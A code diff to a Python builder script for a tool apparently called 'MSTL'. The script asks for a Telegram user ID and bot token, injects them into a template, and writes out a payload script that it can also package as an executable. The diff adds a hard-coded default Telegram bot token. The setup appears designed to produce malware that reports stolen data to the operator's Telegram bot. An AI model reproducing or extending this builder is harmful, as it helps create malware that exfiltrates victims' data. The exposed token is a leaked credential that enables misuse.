@@ -1,3 +1,4 @@
+# MSTL Bot Normal Token: 6622962602:AAERgZlXugMGZIA5vqkIpv5KKAAsDUrA6is
 from colorama import init, Fore
 from os import system
 init()
@@ -70,10 +71,10 @@ MMM  M'  "MMM      "YMmMY"          MMM        ;;;;;YUMMM
     import os
     os.system('cls' if os.name == 'nt' else 'clear')
     print(Fore.CYAN + banners[randint(0, 3)])
-def make_python(ID):
+def make_python(ID, TOKEN):
     with open("builder/build.py", "r") as read: 
         text = read.readlines()
-        text = "".join(text).replace("TELEGRAM_ID", ID)
+        text = "".join(text).replace("TELEGRAM_ID", ID).replace("BOT_TOKEN", f'"{TOKEN}"')
     system("mkdir output")
     with open("output/mstl.py", "w") as write:
         write.write(text)
@@ -85,7 +86,12 @@ def make_exe():
 banner()
 try: 
     id = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " write your telegram user id(with @userinfobot): "))
-    make_python(ID=id)
+    tok = str(input(Fore.GREEN + "[+]" + Fore.WHITE + "If you want to use custome token write C if not press enter: ")).lower()
+    if tok == "c":
+        token = input("Write your bot token: ")
+    else: 
+        token = "6622962602:AAERgZlXugMGZIA5vqkIpv5KKAAsDUrA6is"
+    make_python(ID=id, TOKEN=token)
     opt = input(Fore.YELLOW + "Make it exe(Y for yes and N for no)? " + Fore.RESET).lower()
     if opt == "y": 
         make_exe()
